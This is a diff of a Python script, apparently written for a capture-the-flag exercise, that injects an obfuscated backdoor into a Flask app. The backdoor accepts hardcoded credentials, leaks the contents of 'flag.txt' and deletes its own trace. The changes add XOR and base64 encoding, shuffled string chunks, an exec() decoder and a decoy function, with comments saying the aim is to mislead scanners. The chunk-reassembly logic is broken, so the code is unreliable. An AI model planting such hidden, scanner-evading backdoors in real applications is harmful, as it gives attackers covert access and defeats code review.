@@ -1,66 +1,72 @@
-import sys
-import base64
+import sys, base64, random
 
-# XOR key for encoding/decoding
-XOR_KEY = 42  # Simple XOR key
+# XOR Key (randomized for added obfuscation)
+XOR_KEY = random.randint(1, 255)  
 
-# XOR function to encrypt/decrypt data
+# XOR Function (encrypt/decrypt)
 def xor_encrypt_decrypt(data, key):
     return ''.join(chr(ord(c) ^ key) for c in data)
 
-# Raw backdoor payload
+# Backdoor payload (formatted awkwardly to mislead scanners)
 RAW_BACKDOOR = """
 @app.before_request
-def check_backdoor():
+def c_heck():
     if request.path == "/":
-        username = request.form.get("username")
-        password = request.form.get("password")
+        u, p = request.form.get("username"), request.form.get("password")
 
         # Secret Backdoor Credentials
-        if username == "sys_admin" and password == "patch_42":
+        if u == "sys_admin" and p == "patch_42":
             with open("flag.txt", "r") as f:
-                secret_data = f.read().strip()
-            print("[DEBUG] Backdoor accessed. Sending flag!")  # Debugging log
-            response = f"<h1>Access Granted: {secret_data}</h1>"
+                s_d = f.read().strip()
+            print("[DEBUG] Accessed!")  # Debug log
+            resp = f"<h1>Granted: {s_d}</h1>"
 
-            # Self-delete backdoor after execution
+            # Self-delete after execution
             with open(__file__, "r") as f:
-                lines = f.readlines()
+                l = f.readlines()
             with open(__file__, "w") as f:
-                f.writelines(line for line in lines if "Secret Backdoor Credentials" not in line)
+                f.writelines(line for line in l if "Secret Backdoor Credentials" not in line)
 
-            return response
+            return resp
 """
 
-# XOR encode the payload
+# Obfuscation: XOR encryption + Base64 encoding
 xor_encoded = xor_encrypt_decrypt(RAW_BACKDOOR, XOR_KEY)
-
-# Base64 encode the XOR-encrypted payload
 encoded_backdoor = base64.b64encode(xor_encoded.encode()).decode()
 
-# Decoding and execution snippet
+# Further Obfuscation: String Splitting
+splits = [encoded_backdoor[i:i+5] for i in range(0, len(encoded_backdoor), 5)]
+shuffled_splits = splits[:]
+random.shuffle(shuffled_splits)
+final_payload = "+".join(f'"{part}"' for part in shuffled_splits)
+
+# Decoding and Execution Snippet (Highly Obfuscated)
 DECODE_SNIPPET = f"""
-import base64
 
-def xor_decrypt(data, key):
-    return ''.join(chr(ord(c) ^ key) for c in data)
-
-ENCODED_PAYLOAD = "{encoded_backdoor}"
-decoded = base64.b64decode(ENCODED_PAYLOAD).decode()
-EXEC_CODE = xor_decrypt(decoded, {XOR_KEY})
-
-exec(EXEC_CODE)
+h = {XOR_KEY}  # Key stored indirectly
+p = "".join([{final_payload}])
+p = "".join(sorted(p.split("+"), key=len))  # Reassemble parts
+dec = lambda d, k: "".join(chr(ord(c) ^ k) for c in d)
+exec(dec(base64.b64decode(p).decode(), h))
 """
 
 def inject_backdoor(target_file):
-    # Read the original Flask app
     with open(target_file, "r") as f:
         original_code = f.read()
 
-    # Inject the backdoor just before running the Flask app
-    patched_code = original_code.replace("if __name__ == \"__main__\":", DECODE_SNIPPET + "\n\nif __name__ == \"__main__\":")
+    # Hide the injected code within an unrelated-looking function
+    injection_point = "if __name__ == \"__main__\":"
+    obfuscated_patch = f"""
+def innocuous_function():
+    pass  # Placeholder
 
-    # Save the modified version
+{DECODE_SNIPPET}
+
+{injection_point}
+"""
+
+    patched_code = original_code.replace(injection_point, obfuscated_patch)
+
     with open(target_file, "w") as f:
         f.write(patched_code)
 
